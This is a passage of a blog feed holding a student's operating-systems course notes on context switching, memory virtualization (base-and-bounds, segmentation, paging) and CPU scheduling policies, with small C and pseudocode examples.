<li><p><strong>Solution</strong>: </p>
<ul>
<li><p>Using protected control transfer to control users’ behaviors.</p>
<ol>
<li><p><font color="3A75EA"><strong>User Mode</strong></font>: Applications do not have full access to hardware resources.</p>
</li>
<li><p><font color="3A75EA"><strong>Kernel Mode</strong></font>: The OS has access to the full resources of the machine.</p>
</li>
</ol>
<ul>
<li>There are some privileged instructions</li>
<li>If users execute those privileged instructions under user mode, the system can limit the users’ behaviors.</li>
<li>Users can only execute those privileged instructions under kernel mode through system call.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="System-Call"><a href="#System-Call" class="headerlink" title="System Call"></a>System Call</h3><ul>
<li>Allow the users utilize the sysyem services through system calls.</li>
<li>It allows the kernel to <font color="F54747">carefully expose</font> certain <font color="3A75EA">key pieces of functionality</font> to user program, such as,<ul>
<li>accessing the file system</li>
<li>creating and destorying processes</li>
<li>communicating with other processes</li>
<li>allocating more memory</li>
</ul>
</li>
<li>Users can only call those system calls to get the services.</li>
</ul>
<ol>
<li><p><strong>Trap Instuction</strong></p>
<ul>
<li>switch from user mode to kernel mode (raise the privilege level to kernel mode).</li>
</ul>
</li>
<li><p><strong>Return-from-trap Instruction</strong></p>
<ul>
<li>return into the calling user program (reduce the privilege level to user mode).</li>
</ul>
</li>
</ol>
<h3 id="Limited-Direction-Execution"><a href="#Limited-Direction-Execution" class="headerlink" title="Limited Direction Execution"></a>Limited Direction Execution</h3><h4 id="Execution-Procedure-1"><a href="#Execution-Procedure-1" class="headerlink" title="Execution Procedure"></a>Execution Procedure</h4><img src="https://p.ipic.vip/0u1e9k.png" width="500px">

<h4 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h4><ul>
<li><strong>Problem</strong>: <font color="F54747"><strong>Switching between Processes</strong></font><ul>
<li>How can the OS <font color="F54747">regain control</font> (重新獲取控制權) of the CPU so that it can switch between the processes?</li>
</ul>
</li>
</ul>
<ol>
<li><p><font color="3A75EA"><strong>Cooperative Approach: Wait for system call</strong></font></p>
<ul>
<li>Processes periodically give up the CPU by making system calls, like <code>yield</code> (i.e., wait until the running process gives up the control).<ul>
<li>The OS decides to run other tasks.</li>
<li>Application also transfers control to the OS when they do something illegal, such as, divide by zero.</li>
</ul>
</li>
<li><font color="F54747">Problem: a process may get stuck in an infinite loop, if this happened, we need to reboot the machine.</font></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Non-cooperative Approach: The OS takes control</strong></font> through a <font color="F54747"><strong>timer interrupt</strong></font>.</p>
<ol>
<li><p>During the boot sequence, the OS starts the <font color="3A75EA">timer</font>.</p>
</li>
<li><p>The timer raises an interrupt every specific milliseconds.</p>
</li>
<li><p>When the interrupt is raised</p>
<ul>
<li>The currect running process is halted.</li>
<li>Save enough of the state of the program.</li>
<li>A pre-configured interrupt handler in the OS runs.</li>
</ul>
</li>
<li><p>After that, the <font color="3A75EA">scheduler</font> can make a decision:</p>
<ul>
<li>Continue running the current process or switch to different process.</li>
<li>If the decision is switch, the OS will execute <font color="F54747"><strong>Context switch</strong></font>.</li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="Context-Switch"><a href="#Context-Switch" class="headerlink" title="Context Switch"></a>Context Switch</h3><ol>
<li><p><font color="3A75EA"><strong>Save the value of necessary registers</strong></font> for the current process onto its kernel stack.</p>
</li>
<li><p><font color="3A75EA"><strong>Restore the register values</strong></font> for the soon-to-be-executing process from its kernel stack.</p>
</li>
<li><p><font color="3A75EA"><strong>Switch to the kernel stack</strong></font> for the soon-to-be-executing process.</p>
</li>
</ol>
<ul>
<li>Examples: If we want to switch from process A to process B<ol>
<li>save the necessary registers of process A onto its kernel stack</li>
<li>restore the registers for process B from its kernel stack</li>
<li>switch to process B kernel stack</li>
</ol>
</li>
</ul>
<img src="https://p.ipic.vip/bis8ht.png" width="500px">
<img src="https://p.ipic.vip/wsk38g.png" width="500px">
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing Memory (Address Space)</title>
    <url>/myBlog/2022/11/18/2022/CSCI3150/2022-11-18-CSCI3150-Virtualizing-Memory-Address-Space%20copy/</url>
    <content><![CDATA[<h2 id="Memory-Virtualization"><a href="#Memory-Virtualization" class="headerlink" title="Memory Virtualization"></a>Memory Virtualization</h2><ol>
<li><p>Introduction</p>
<ul>
<li>OS virtualizes its physical memory</li>
<li>OS provides an illusion memory space per each process</li>
</ul>
</li>
<li><p>Benefit</p>
<ol>
<li>Ease to use in programming</li>
<li>Memory efficiency in items of time and space</li>
<li>Isolate the processes and OS, protect from <font color="3A75EA">errant accesses</font> of other processes</li>
</ol>
</li>
<li><p>Multiprogramming and Time Sharing</p>
<ul>
<li><p>Load <font color="3A75EA">multiple processes</font> in memory</p>
<ol>
<li>execute one process for a while</li>
<li>switch processes between them in the memory</li>
</ol>
<ul>
<li>increase utilization and efficiency</li>
</ul>
</li>
<li><p>But it causes an important <font color="F54747">protection problem</font> as the errant memory accesses from other processes</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h89c6pws46j30rk11uwju.jpg" width="300px"></li>
</ul>
</li>
</ol>
<h3 id="Address-Space"><a href="#Address-Space" class="headerlink" title="Address Space"></a>Address Space</h3><ul>
<li><p>OS creates an abstraction of physical memory</p>
<ul>
<li>The address space contains all about a running process  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ipm6a56uj30kg0veq6k.jpg" width="250px"></li>
</ul>
</li>
<li><p>Structure:</p>
<ol>
<li>Code: Instructions</li>
<li>Data: Global or static local variables</li>
<li>Heap: Dynamically allocate memory (<code>malloc</code>)</li>
<li>Stack: <ul>
<li>Store return address or values (parameters)</li>
<li>Contain local variables arguments to routines</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Virtual-Address"><a href="#Virtual-Address" class="headerlink" title="Virtual Address"></a>Virtual Address</h3><ul>
<li>Every address in a running program is virtual (OS translates the virtual address to physical address)  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of code  : %p\n&quot;</span>, (<span class="type">void</span> *) main);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of heap  : %p\n&quot;</span>, (<span class="type">void</span> *) <span class="built_in">malloc</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="type">int</span> x = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of stack : %p\n&quot;</span>, (<span class="type">void</span> *) &amp;x);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Outputs: Code &gt; Heap &gt;&gt; Stack</span></span><br><span class="line"><span class="comment">        location of code  : 0x102937ed8</span></span><br><span class="line"><span class="comment">        location of heap  : 0x132606810</span></span><br><span class="line"><span class="comment">        location of stack : 0x16d4cb42c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Address-Transition"><a href="#Address-Transition" class="headerlink" title="Address Transition"></a>Address Transition</h2><ul>
<li><p>Relocation Address Space</p>
<ul>
<li>Every process has it own address space (start at address 0).</li>
<li>The OS wants to place the process somewhere else in physical memory, not at address 0.</li>
</ul>
<ol>
<li>Single Process</li>
</ol>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iqa3asucj31dd0u0dlw.jpg" width="500px">

<ol start="2">
<li>Multiple Processes<ul>
<li><font color="3A75EA">Base register</font>: store the location of the process in physical memory, so that it can easily address the memory by adding the base register.</li>
<li><font color="3A75EA">Bounds register</font>: remember the maximum length of address space.</li>
<li>It can prevent the process access the location out of the boundary.</li>
</ul>
</li>
</ol>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iq81env7j315b0u0wkj.jpg" width="400px"></li>
</ul>
<h3 id="Dynamic-Relocation"><a href="#Dynamic-Relocation" class="headerlink" title="Dynamic Relocation"></a>Dynamic Relocation</h3><ul>
<li>When a program starts running, the OS decides <font color="3A75EA">where</font> a process should be loaded <font color="3A75EA">in physical memory</font>.<ul>
<li><p>Set the base register a value<br>  $$ physical \thinspace address &#x3D; virtual \thinspace address + base $$</p>
</li>
<li><p>Every virtual address must <font color="F54747">not be negative or greater than bound</font><br>  $$ 0 \leq virtual \thinspace address &lt; bounds $$</p>
</li>
<li><p>Two ways of bounds register</p>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iqa3ww0aj31e50u0tf4.jpg" width="500px"></li>
</ul>
</li>
</ul>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><ol>
<li><p>Base</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ir7pmn5qj31am0iatb2.jpg" width="500px">
</li>
<li><p>Base + Bounds</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ir7r3ogbj31am0i6q5v.jpg" width="500px"></li>
</ol>
<h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><ul>
<li><p>The OS must take action to implement <font color="3A75EA">base-and-bounds</font> approach</p>
</li>
<li><p>Three critical junctures:</p>
<ol>
<li><p>When a process <font color="3A75EA">starts running</font>: Finding space for address space in physical memory.</p>
<ul>
<li><font color="F54747">free list</font>: a list of the range of the physical memory are <font color="F54747">not in use</font>. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfvowo3j31i00q842a.jpg" width="500px"></li>
</ul>
</li>
<li><p>When a process is <font color="3A75EA">terminated</font>: Reclaiming the memory for use.</p>
<ul>
<li>The OS must <font color="F54747">put the memory back</font> to the free list. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfu7fojj31i00n6dls.jpg" width="500px"></li>
</ul>
</li>
<li><p>When context <font color="3A75EA">switch occurs</font>: Saving and storing the base-and-bounds pair.</p>
<ul>
<li>The OS must <font color="F54747">save and restore</font> the base-and-bounds pair. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfshofsj31i00pctdi.jpg" width="500px"></li>
</ul>
</li>
</ol>
</li>
<li><p>Inefficiency</p>
<ol>
<li>Big chunk of free space</li>
<li>The free space takes up physical memory</li>
<li>Hard to run when an address space does not fit into the physical memory (e.g. 4KB space)</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing Memory (Segmentation and Paging)</title>
    <url>/myBlog/2022/11/26/2022/CSCI3150/2022-11-26-CSCI3150-Virtualizing-Memory-Segmentation-Paging/</url>
    <content><![CDATA[<h2 id="Segmentation"><a href="#Segmentation" class="headerlink" title="Segmentation"></a>Segmentation</h2><ul>
<li>Segment is <font color="3A75EA">a contiguous portion</font> of the address space of a particular length.<ul>
<li>Different segments: code, stack, heap.</li>
<li>Each segment can be placed in <font color="3A75EA">different part of physical memory</font>.<ul>
<li>base and bounds exist in each segment  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8isrvo2yzj31dr0u0dl6.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Address-Transition"><a href="#Address-Transition" class="headerlink" title="Address Transition"></a>Address Transition</h3><p>$$ physical \thinspace address &#x3D; offset + base $$</p>
<ul>
<li><p>The code segment starts at the <font color="3A75EA">virtual address 0</font> in address space.</p>
</li>
<li><p>Example:</p>
<ol>
<li><p>Code Segment: the offset of virtual address 100 is 100.</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8isuq8elcj31qk0rwn4d.jpg" width="500px">
</li>
<li><p>Heap Segment: the offset of virtual address 4200 is 104.</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8it14f3uzj31qk0ssdna.jpg" width="500px"></li>
</ol>
</li>
<li><p>Segmentation Fault</p>
<ul>
<li>If an illegal Address is referenced, the hardware detects that the address is <font color="3A75EA">out of bounds</font>.</li>
</ul>
</li>
</ul>
<h3 id="Referring-to-Segment"><a href="#Referring-to-Segment" class="headerlink" title="Referring to Segment"></a>Referring to Segment</h3><ul>
<li><p><strong>Explicit approach</strong></p>
<ul>
<li>chop up the address space into segments based on the <font color="3A75EA">top few bits</font> of virtual address.</li>
<li>Example: virtual address 4200 (<code>01000001101000</code>)  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itd4u9ulj31qk0b4ta8.jpg" width="400px">
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    SEG_MASK = 0x3000 (11000000000000)</span></span><br><span class="line"><span class="comment">    SEG_SHIFT = 12</span></span><br><span class="line"><span class="comment">    OFFSET_MASK = 0xFFF (00111111111111)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// get top 2 bits of 14-bit VA</span></span><br><span class="line">Segment = (VirtualAddress &amp; SEG_MASK) &gt;&gt; SEG_SHIFT</span><br><span class="line"></span><br><span class="line"><span class="comment">// now get offset</span></span><br><span class="line">Offset = VirtualAddress &amp; OFFSET_MASK</span><br><span class="line"><span class="keyword">if</span> (Offset &gt;= Bounds[Segment])&#123;</span><br><span class="line">    RaiseException(PROTECTION_FAULT)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    PhysAddr = Base[Segment] + Offset</span><br><span class="line">    Register = AccessMemory(PhysAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Stack Segment</strong></p>
<ul>
<li>Since stack grows backward, an <font color="3A75EA">extra hardware support</font>:<ul>
<li>The hardware checks which way the segment grows</li>
<li><code>1</code> - positive direction, <code>0</code> - negative direction  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itl1l7kcj31qk0n0792.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Sharing</strong></p>
<ul>
<li>Segment can be shared between address space by an <font color="3A75EA">extra hardware support</font>: <font color="F54747"><strong>Production bits</strong></font><ul>
<li>a few more bit to indicate permissions of <font color="3A75EA">read</font>, <font color="3A75EA">write</font> and <font color="3A75EA">execute</font> in each segment   <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itpg0fbrj31qk0cuq56.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Fragmentation"><a href="#Fragmentation" class="headerlink" title="Fragmentation"></a>Fragmentation</h3><ul>
<li><p><strong>External Fragmentation</strong>: some little holes of <font color="3A75EA">free space</font> in the physical memory that make difficulty to allocate new segments.</p>
</li>
<li><p><strong>Compaction</strong>: rearranging the exiting segments in physical memory, but it is costly.</p>
<ul>
<li>Stop the running process</li>
<li>Copy data to somewhere</li>
<li>Change segment register value  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itxjpxplj31gs0u0gro.jpg" width="500px"></li>
</ul>
</li>
</ul>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>Segmentation uses the base-bounds pair to represent the location and boundary of process in the physical memory<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iw3wu4gwj310n0u0afr.jpg" width="500px"></li>
</ul>
<h2 id="Paging"><a href="#Paging" class="headerlink" title="Paging"></a>Paging</h2><ul>
<li><p>Paging <font color="3A75EA">splits up</font> the address space into <font color="F54747">fixed-sized</font> unit called a <font color="F54747">page</font>.</p>
</li>
<li><p>With paging, physical memory is also split into some number of pages called a <font color="F54747">page frame</font>.</p>
</li>
<li><p><font color="3A75EA">Page table</font> per process is needed to <font color="3A75EA">translate</font> the virtual address to physical address.</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iu4scb3fj31j20u0te2.jpg" width="500px">
</li>
<li><p><strong>Advantages</strong></p>
<ol>
<li><p><font color="3A75EA">Flexibility</font>: </p>
<ul>
<li>Do not need to assume how heap and stack grow and be used.</li>
</ul>
</li>
<li><p><font color="3A75EA">Simplicity</font>: </p>
<ul>
<li>The page in address space and the page frame are same size (usually 4KB).</li>
<li>Easy to allocate and keep a free list</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Address-Transition-1"><a href="#Address-Transition-1" class="headerlink" title="Address Transition"></a>Address Transition</h3><img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iuj0y0taj31cs0u0afq.jpg" width="500px">

<ul>
<li><p>Two components in the virtual address</p>
<ol>
<li><font color="3A75EA">VPN</font>: virtual page number</li>
<li><font color="3A75EA">Offset</font>: offset within the page  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iumjzfwtj31uo090t9b.jpg" width="500px">
 
<ul>
<li>For a 64-byte address space with 16 bytes page.</li>
<li>We have $4 &#x3D; 2^2$ pages and and page size $16 &#x3D; 2^4$.</li>
<li>Therefore, we can use 6 bits to represent the address, where the first 2 bits are VPN, the rest are the offset.</li>
</ul>
</li>
</ol>
</li>
<li><p>Example:</p>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iumivlahj31sz0u0wgt.jpg" width="500px"></li>
</ul>
<h3 id="Page-Table"><a href="#Page-Table" class="headerlink" title="Page Table"></a>Page Table</h3><ul>
<li><p>The page table is just a data structure (array) that is used to map the virtual address to physical address.</p>
</li>
<li><p>The OS indexes the array by VPN and looks up the page-table entry.</p>
</li>
<li><p>Page Table Storage:</p>
<ul>
<li>Page tables can get very large:<ul>
<li>32-bit address ($2^{32} &#x3D; 4$GB) space with 4-KB pages and 20bits for VPN<br>  ($4$MB &#x3D; $2^{20}$ entries * $2^2$ bytes per table entry)</li>
</ul>
</li>
</ul>
</li>
<li><p>Common Flags of Page Table Entry</p>
<ol>
<li><font color="3A75EA">Valid Bit</font>: Indicating whether the particular transition is valid.</li>
<li><font color="3A75EA">Protection Bit</font>: Indicating whether the page could be read from, written to, or execute from.</li>
<li><font color="3A75EA">Present Bit</font>: Indicating whether this page is in physical memory or on disk.</li>
<li><font color="3A75EA">Dirty Bit</font>: Indicating whether the page has been modified since it was brought into memory.</li>
<li><font color="3A75EA">Reference Bit (Accessed Bit)</font>: Indicating that a page has been accessed.  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ivefbutkj31uo0aoabq.jpg" width="500px">
 
<ul>
<li><code>P</code>: present bit</li>
<li><code>R/W</code>: read &#x2F; write bit</li>
<li><code>U/S</code>: supervisor</li>
<li><code>A</code>: accessed bit</li>
<li><code>D</code>: dirty bit</li>
<li><code>PFN</code>: the page frame number</li>
</ul>
</li>
</ol>
</li>
<li><p>Access memory with paging</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Extract the VPN from the virtual address</span></span><br><span class="line">VPN = (VirtualAddress &amp; VPN_MASK) &gt;&gt; SHIFT</span><br><span class="line"></span><br><span class="line"><span class="comment">// Form the address of the page-table entry (PTE)</span></span><br><span class="line">PTEAddr = PTBR + (VPN * <span class="keyword">sizeof</span>(PTE))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch the PTE</span></span><br><span class="line">PTE = AccessMemory(PTEAddr)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if process can access the page</span></span><br><span class="line"><span class="keyword">if</span> (PTE.Valid == False) &#123;</span><br><span class="line">    RaiseException(SEGMENTATION_FAULT)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CanAccess(PTE.ProtectBits) == False) &#123;</span><br><span class="line">    RaiseException(PROTECTION_FAULT)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Access is OK: form physical address and fetch it</span></span><br><span class="line">    offset = VirtualAddress &amp; OFFSET_MASK</span><br><span class="line">    PhysAddr = (PTE.PFN &lt;&lt; PFN_SHIFT) | offset</span><br><span class="line">    Register = AccessMemory(PhysAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><strong>Disadvantage</strong>: Paging is too slow</p>
<ul>
<li>To find a location of the target PTE, the starting location of the page table is needed.</li>
<li>For every memory reference, paging requires the OS to perform one extra memory reference.</li>
</ul>
</li>
</ul>
<h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>Paging divides the virtual address and physical memory into pages with same page size.</li>
<li>Use the page table to store the mapping PFN for each process.<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iw72ecnbj31170u07aq.jpg" width="500px"></li>
</ul>
<!-- <img src="" width="500px">
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font> -->]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing CPU (Scheduling)</title>
    <url>/myBlog/2022/11/04/2022/CSCI3150/2022-11-4-CSCI3150-Virtualizing-CPU-Scheduling/</url>
    <content><![CDATA[<h2 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h2><h3 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h3><ol>
<li>Each job runs for <font color="3A75EA">same among of time</font>.</li>
<li>All jobs <font color="3A75EA">arrive at the same time</font>.</li>
<li>All jobs only use the <font color="3A75EA">CPU</font> (i.e., no I&#x2F;O operations).</li>
<li>The <font color="3A75EA">running time</font> of each job is known.</li>
</ol>
<h3 id="Scheduling-Metrics"><a href="#Scheduling-Metrics" class="headerlink" title="Scheduling Metrics"></a>Scheduling Metrics</h3><ol>
<li><p>Performance Metric: <font color="F54747"><strong>Turnaround Time</strong> (往返時間)</font></p>
<ul>
<li>The time at which <font color="3A75EA">the job completes</font> minus the time at which <font color="3A75EA">the job arrived</font> in the system.<br> $$T_{turnaround} &#x3D; T_{completion} - T_{arrival}$$</li>
</ul>
</li>
<li><p>Another Metric: <font color="F54747"><strong>Fairness</strong></font></p>
</li>
<li><p>New Metric: <font color="F54747"><strong>Response Time</strong></font></p>
<ul>
<li>The time from <font color="3A75EA">when the job arrives</font> to the <font color="3A75EA">first time it is scheduled</font>.<br> $$T_{response} &#x3D; T_{firstrun} - T_{arrival}$$</li>
</ul>
</li>
</ol>
<h2 id="Scheduling-Strategies"><a href="#Scheduling-Strategies" class="headerlink" title="Scheduling Strategies"></a>Scheduling Strategies</h2><h3 id="Simple-Strategies"><a href="#Simple-Strategies" class="headerlink" title="Simple Strategies"></a>Simple Strategies</h3><h4 id="First-In-First-Out-FIFO"><a href="#First-In-First-Out-FIFO" class="headerlink" title="First In First Out (FIFO)"></a><font color="F54747">First In First Out (FIFO)</font></h4><ul>
<li><p>a simple and easy to implement strategy.</p>
</li>
<li><p>Example:</p>
<ul>
<li>A arrived just before B which also arrived just before C.</li>
<li>Each job runs for 10 seconds.  <img src="https://p.ipic.vip/es9yk7.png" width="400px">
  $$T_{average\,turnaround} = \frac{10 + 20 + 30}{3} = 20s$$</li>
</ul>
</li>
<li><p>Problem: </p>
<ul>
<li>If we <font color="3A75EA">relax the assumption 1 (Each job runs for same among of time)</font>:<ul>
<li>A runs for 100 seconds, B and C run for 10 seconds each.  <img src="https://p.ipic.vip/yttjpe.png" width="400px">
  $$T_{average\,turnaround} = \frac{100 + 110 + 120}{3} = 110s$$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Shortest-Job-First-SJF"><a href="#Shortest-Job-First-SJF" class="headerlink" title="Shortest Job First (SJF)"></a><font color="F54747">Shortest Job First (SJF)</font></h4><ul>
<li><p>run the shortest job first, then the next shortest, and so on.</p>
</li>
<li><p>Example:</p>
<ul>
<li>A arrived just before B which also arrived just before C.</li>
<li>A runs for 100 seconds, B and C run for 10 seconds each.  <img src="https://p.ipic.vip/avf7iy.png" width="400px">
  $$T_{average\,turnaround} = \frac{10 + 20 + 120}{3} = 50s$$</li>
</ul>
</li>
<li><p>Problem: </p>
<ul>
<li>If we <font color="3A75EA">relax the assumption 2 (All jobs arrive at the same time)</font>:<ul>
<li>A arrives at t &#x3D; 0, B and C arrive at t &#x3D; 10.  <img src="https://p.ipic.vip/baycel.png" width="400px">
  $$T_{average\,turnaround} = \frac{100 + (110 - 10) + (120 - 10)}{3} = 103.3s$$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Shortest-Time-to-Completion-First-STCF"><a href="#Shortest-Time-to-Completion-First-STCF" class="headerlink" title="Shortest Time-to-Completion First (STCF)"></a>Shortest Time-to-Completion First (STCF)</h4><ul>
<li><p>Add a preemption to SJF, when a new job enters the system:</p>
<ol>
<li>Determine the remaining jobs and new job</li>
<li>Schedule the job which has the least time left</li>
</ol>
</li>
<li><p>Example:</p>
<ul>
<li>A arrives at t &#x3D; 0 and needs to run for 100 seconds.</li>
<li>B and C arrive at t &#x3D; 10 and need to run for 10 seconds.  <img src="https://p.ipic.vip/16zklv.png" width="400px">
  $$T_{average\,turnaround} = \frac{(120 - 0) + (20 - 10) + (30 - 10)}{3} = 50s$$</li>
</ul>
</li>
</ul>
<h4 id="Round-Robin-RR"><a href="#Round-Robin-RR" class="headerlink" title="Round Robin (RR)"></a>Round Robin (RR)</h4><ul>
<li><p>Run a job for a <font color="3A75EA">time slice</font>, and switch to the next job in the <font color="3A75EA">run queue</font> until the jobs are finished.</p>
</li>
<li><p>The length of the time slice must be a <font color="F54747">multiple of the timer-interrupt period</font>.</p>
</li>
<li><p><font color="F54747">Noted</font>: RR is fair, but performs poorly on performance metrics like turnaround time.</p>
</li>
<li><p>Example:</p>
<ul>
<li><p>A, B and C arrive at the same time and each of them run for 5 seconds.</p>
</li>
<li><p>In SJF:</p>
  <img src="https://p.ipic.vip/bkq1aw.png" width="400px">
  $$T_{average\,response} = \frac{0 + 5 + 10}{3} = 5s$$

</li>
<li><p>In RR:</p>
  <img src="https://p.ipic.vip/nx41d7.png" width="400px">
  $$T_{average\,response} = \frac{1 + 1 + 1}{3} = 1s$$</li>
</ul>
</li>
<li><p>Length of time slice</p>
<ul>
<li><p><font color="3A75EA">Shorter time slice</font></p>
<ul>
<li>Better response time.</li>
<li>The cost of context switching will dominate the overall performance.</li>
</ul>
</li>
<li><p><font color="3A75EA">Longer time slice</font></p>
<ul>
<li>Worse response time.</li>
<li>Reduce the cost of switching.</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Incorporating I&#x2F;O</strong></p>
<ul>
<li><p>Relax the assumption 3 (All jobs only use the CPU).</p>
</li>
<li><p>When a job initiates an I&#x2F;O request:</p>
<ol>
<li>The job is blocked until the I&#x2F;O request completed.</li>
<li>The scheduler should schedule another job on the CPU.</li>
</ol>
</li>
<li><p>When the I&#x2F;O completes,</p>
<ol>
<li>An interrupt is raised.</li>
<li>The OS moves the process from the blocked state back to the ready state.</li>
</ol>
</li>
<li><p>Example:</p>
<ul>
<li>A and B need 50ms of CPU time each.</li>
<li>In every 10ms, A issues an I&#x2F;O request (takes 10ms).</li>
<li>B simply uses the CPU for 50ms and performs no I&#x2F;O request.</li>
<li>The scheduler runs A first.      <img src="https://p.ipic.vip/5yn1jh.png" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Multi-Level-Feedback-Queue"><a href="#Multi-Level-Feedback-Queue" class="headerlink" title="Multi-Level Feedback Queue"></a>Multi-Level Feedback Queue</h3><h4 id="Basic-Rules"><a href="#Basic-Rules" class="headerlink" title="Basic Rules"></a>Basic Rules</h4><ol>
<li><p>MLFQ has a number of distinct <font color="3A75EA">queues</font></p>
<ul>
<li>each queue is assigned a different priority level (優先次序).</li>
</ul>
</li>
<li><p>A job that is ready to run is on a <font color="3A75EA">signle queue</font></p>
<ul>
<li>a job on a <font color="F54747">higher priority</font> is chosen to run.</li>
<li>use round-robin scheduling among jobs in the same queue.</li>
<li>Rule 1: <font color="F54747">If Priority(A) &gt; Priority(B), A runs</font></li>
<li>Rule 2: <font color="F54747">If Priority(A) &#x3D; Priority(B), A and B run in RR</font></li>
</ul>
</li>
</ol>
<ul>
<li>Example:  <img src="https://p.ipic.vip/btp5ge.png" width="300px"></li>
</ul>
<h4 id="Change-Priority"><a href="#Change-Priority" class="headerlink" title="Change Priority"></a>Change Priority</h4><ul>
<li>MLFQ varies the priority of a job based on its observed behavior.</li>
<li>MLFQ priority adjustment algorithm:<ul>
<li>Rule 3: <font color="F54747">When a job enters the system, it is placed at the highest priority</font></li>
<li>Rule 4a: <font color="F54747">If a job uses up an entire time slice while running, its priority will be reduced</font></li>
<li>Rule 4b: <font color="F54747">If a job gives up the CPU before the time slice is up (e.g., I&#x2F;O request), it stays at the same priority level</font></li>
</ul>
</li>
</ul>
<h4 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h4><ol>
<li><p><font color="3A75EA">Single</font> Long-Running Job</p>
<ul>
<li>A three-queue scheduler with time slice 10ms. <img src="https://p.ipic.vip/vor93v.png" width="350px"></li>
<li>According to rule 4a, its priority will be reduce after one time slice.</li>
</ul>
</li>
<li><p>Along Came a Short Job</p>
<ul>
<li>Job A: a long-running CPU-intensive job</li>
<li>Job B: a short-running interactive job, and arrives at time T &#x3D; 100 <img src="https://p.ipic.vip/r9pitc.png" width="350px"></li>
<li>According to rule 3, when a new job enters the system, it is placed at the highest priority.</li>
</ul>
</li>
<li><p>I&#x2F;O Request</p>
<ul>
<li>Job A: a long-running CPU-intensive job</li>
